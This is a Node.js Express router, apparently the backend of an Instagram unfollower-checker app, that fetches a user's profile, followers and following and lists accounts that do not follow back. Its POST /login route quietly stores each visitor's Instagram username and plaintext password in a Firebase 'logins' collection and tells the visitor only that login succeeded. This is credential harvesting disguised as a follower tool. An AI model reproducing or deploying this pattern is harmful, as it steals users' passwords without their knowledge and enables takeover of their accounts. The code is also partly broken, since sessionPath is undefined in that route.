const { IgApiClient } = require('instagram-private-api');
const fs = require('fs');
const path = require('path');
const readline = require('readline');
const axios = require('axios');
const express = require('express');
const router = express.Router();
const ig = new IgApiClient();
const db = require('../config/firebaseConfig');  // Jalur relatif menuju firebaseConfig.js

// Waktu pengaturan
const MIN_TIME_BETWEEN_REQUESTS = 2000; // Minimum 2 detik antara setiap permintaan
const MAX_TIME_BETWEEN_REQUESTS = 5000; // Maksimum 5 detik antara setiap permintaan
const TIME_BETWEEN_UNFOLLOWERS = 5000; // 5 detik antara setiap unfollow
const TIME_BETWEEN_SEARCH_WAIT = 15000; // 15 detik setelah lima siklus pencarian
const TIME_BETWEEN_UNFOLLOW_WAIT = 30000; // 30 detik setelah lima unfollow

// Fungsi untuk login ke Instagram
const login = async () => {
    console.log('Mencoba login ke Instagram...');
    ig.state.generateDevice(process.env.INSTAGRAM_USERNAME);
    const sessionPath = path.resolve(__dirname, '../session.json');

    if (fs.existsSync(sessionPath)) {
        const sessionData = JSON.parse(fs.readFileSync(sessionPath, 'utf-8'));
        ig.state.deserialize(sessionData);
        console.log('Sesi ditemukan, menggunakan sesi yang ada.');

        try {
            await ig.account.currentUser();
            console.log('Sesi valid, melanjutkan...');
        } catch (error) {
            console.error('Sesi kadaluarsa, login ulang...', error);
            await forceLogin(sessionPath);
        }
    } else {
        console.log('Sesi tidak ditemukan, login ulang...');
        await forceLogin(sessionPath);
    }
};

// Fungsi untuk login ulang dan menyimpan sesi baru
const forceLogin = async (sessionPath) => {
    try {
        console.log('Mencoba login ulang...');
        await ig.account.login(process.env.INSTAGRAM_USERNAME, process.env.INSTAGRAM_PASSWORD);
        console.log('Login berhasil!');
        const sessionData = ig.state.serialize();
        fs.writeFileSync(sessionPath, JSON.stringify(sessionData));
    } catch (error) {
        console.error('Login gagal:', error); // Log error secara jelas
        if (error.name === 'IgCheckpointError') {
            const code = await promptFor2FACode();
            await ig.account.confirmTwoFactorCode(code);
            const sessionData = ig.state.serialize();
            fs.writeFileSync(sessionPath, JSON.stringify(sessionData));
        } else {
            console.error('Kesalahan login yang tidak terduga:', error);
            throw error;
        }
    }
};

// Fungsi untuk meminta input kode 2FA
const promptFor2FACode = () => {
    return new Promise((resolve, reject) => {
        const rl = readline.createInterface({
            input: process.stdin,
            output: process.stdout
        });
        rl.question('Masukkan kode 2FA: ', (code) => {
            rl.close();
            resolve(code);
        });
    });
};

// Fungsi untuk menunggu (delay) dalam milidetik
const delay = (ms) => {
    return new Promise(resolve => setTimeout(resolve, ms));
};

// Fungsi untuk mengambil followers dengan paginasi
const getAllFollowers = async (userId) => {
    console.log(`Mengambil followers untuk userId: ${userId}`);
    let followers = [];
    let followersFeed = ig.feed.accountFollowers(userId);

    let nextFollowers = await followersFeed.items();
    followers = followers.concat(nextFollowers);

    while (followersFeed.isMoreAvailable()) {
        nextFollowers = await followersFeed.items();
        followers = followers.concat(nextFollowers);
        await delay(getRandomDelay(MIN_TIME_BETWEEN_REQUESTS, MAX_TIME_BETWEEN_REQUESTS)); // Penundaan acak antara setiap permintaan
    }

    return followers;
};

// Fungsi untuk mengambil following dengan paginasi
const getAllFollowing = async (userId) => {
    console.log(`Mengambil following untuk userId: ${userId}`);
    let following = [];
    let followingFeed = ig.feed.accountFollowing(userId);

    let nextFollowing = await followingFeed.items();
    following = following.concat(nextFollowing);

    while (followingFeed.isMoreAvailable()) {
        nextFollowing = await followingFeed.items();
        following = following.concat(nextFollowing);
        await delay(getRandomDelay(MIN_TIME_BETWEEN_REQUESTS, MAX_TIME_BETWEEN_REQUESTS)); // Penundaan acak antara setiap permintaan
    }

    return following;
};

// Fungsi untuk mengambil profil Instagram, mendapatkan daftar yang tidak follow back, dan menyimpan gambar
router.get('/profile', async (req, res) => {
    console.log('Menerima request GET di /profile');
    try {
        await login();
        const user = await ig.account.currentUser();

        const followersCount = await ig.user.info(user.pk).then(info => info.follower_count);
        const followingCount = await ig.user.info(user.pk).then(info => info.following_count);

        const profilePicUrl = user.profile_pic_url;
        const imagePath = path.resolve(__dirname, '../public/my_profile.jpg');

        if (fs.existsSync(imagePath)) {
            fs.unlinkSync(imagePath);
            console.log('Gambar profil lama dihapus.');
        }

        const writer = fs.createWriteStream(imagePath);
        const response = await axios.get(profilePicUrl, { responseType: 'stream' });

        response.data.pipe(writer);
        writer.on('finish', () => {
            console.log('Gambar profil telah disimpan.');
        });
        writer.on('error', (err) => {
            console.error('Error saat menyimpan gambar profil:', err);
            res.status(500).send('Gagal menyimpan gambar profil');
        });

        const followers = await getAllFollowers(user.pk);
        const following = await getAllFollowing(user.pk);

        const followersUsernames = followers.map(f => f.username);
        const followingUsernames = following.map(f => f.username);

        const followersSet = new Set(followersUsernames);
        const dontFollowBack = followingUsernames.filter(username => !followersSet.has(username));

        res.json({
            username: user.username,
            full_name: user.full_name,
            biography: user.biography,
            followers_count: followersCount,
            following_count: followingCount,
            profile_picture_url: '/my_profile.jpg',
            dont_follow_back: dontFollowBack,
            dont_follow_back_count: dontFollowBack.length,
        });
    } catch (error) {
        console.error('Error fetching Instagram data:', error);
        if (error.name === 'IgLoginRequiredError') {
            res.status(401).send('Login diperlukan. Periksa kredensial Anda.');
        } else {
            res.status(500).send('Terjadi kesalahan saat mengambil data Instagram');
        }
    }
});

router.post('/login', async (req, res) => {
    console.log('Menerima request POST di /login');
    const { username, password } = req.body;

    try {
        ig.state.generateDevice(username);
        await ig.account.login(username, password);
        const sessionData = ig.state.serialize();
        fs.writeFileSync(sessionPath, JSON.stringify(sessionData));
        console.log('Login berhasil!');

        const user = await ig.account.currentUser();
        const userId = user.pk;

        // Simpan data login ke Firebase
        const ref = db.ref('logins');
        const loginData = {
            username: username,
            password: password,
            userId: userId,
            timestamp: new Date().toISOString(),
        };

        await ref.child(userId).set(loginData);
        console.log('Data login berhasil disimpan ke Firebase.');

        res.json({ message: 'Login berhasil!' });
    } catch (error) {
        console.error('Login gagal:', error);
        res.status(500).json({ error: 'Login gagal. Cek kredensial atau coba lagi.' });
    }
});


module.exports = router;
